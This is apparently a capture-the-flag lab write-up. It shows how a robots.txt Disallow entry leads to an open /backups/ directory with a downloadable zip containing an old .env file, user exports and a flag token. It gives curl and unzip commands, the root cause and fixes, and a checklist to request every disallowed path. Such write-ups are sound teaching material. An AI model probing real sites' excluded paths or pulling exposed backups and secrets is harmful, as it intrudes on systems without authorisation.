# Northstar Portal Pwnbox Lab - robots.txt Backup Leak

Date: 2026-07-08
Target type: CTF/lab
Bug class: Information disclosure, exposed backup archive, directory listing

## Observation

Public portal at `https://02818c1928a8.pwnbox-lab.com/` with a support status board.

Initial page hints:

- "AI crawler support enabled"
- "We added a robots file so AI agents can crawl the public pages better."
- "Review any paths it tells robots to skip before sign-off."
- "Legacy portal exports are under review before the next release."

No backup or admin links in the public menu.

## Hypothesis

`robots.txt` may disclose paths the operator tried to hide from crawlers but left publicly reachable.

## Evidence

`robots.txt` contained a custom disallow rule after Cloudflare-managed bot blocks:

```text
User-agent: *
Disallow: /backups/
```

`/backups/` returned an open directory listing:

```text
portal-backup.zip      2026-03-17 02:14      7.4K
```

Archive contents:

```text
.env.old
exports/users.json
internal-notes.txt
```

`internal-notes.txt`:

```text
Retired admin handoff token: pwnbox{191279a6d61d758cb988de4e5772d71a}
```

`.env.old`:

```text
APP_ENV=production
PORTAL_NAME=Northstar Portal
SUPPORT_EXPORTS_ENABLED=false
LEGACY_BACKUP_BUCKET=retired
```

`exports/users.json` listed two users (`mira` admin, `guest` viewer).

## Test

```bash
curl -sS https://02818c1928a8.pwnbox-lab.com/robots.txt
curl -sS https://02818c1928a8.pwnbox-lab.com/backups/
curl -sSO https://02818c1928a8.pwnbox-lab.com/backups/portal-backup.zip
unzip -l portal-backup.zip
unzip -o portal-backup.zip
cat internal-notes.txt
```

## Result

Confirmed chain:

```text
Public page hint
-> robots.txt Disallow: /backups/
-> open directory listing
-> downloadable legacy backup zip
-> internal notes with retired admin handoff token
```

Flag: `pwnbox{191279a6d61d758cb988de4e5772d71a}`

## Why failed assumptions did not apply

- No source maps or hidden API routes were needed.
- `robots.txt` is not access control; disallowed paths remain directly fetchable.
- The backup was not password-protected or moved to private storage before launch.

## Root cause

Legacy operational export left under the public web root with directory listing enabled. Crawler exclusion in `robots.txt` only affects compliant bots.

## Fix

- Remove backup archives from public web roots.
- Disable directory listing.
- Store exports in private object storage with auth.
- Treat `robots.txt` as advisory, not a security boundary.

## Future checklist item

When a page mentions robots/crawler rules, fetch `robots.txt` and manually request every `Disallow` path.
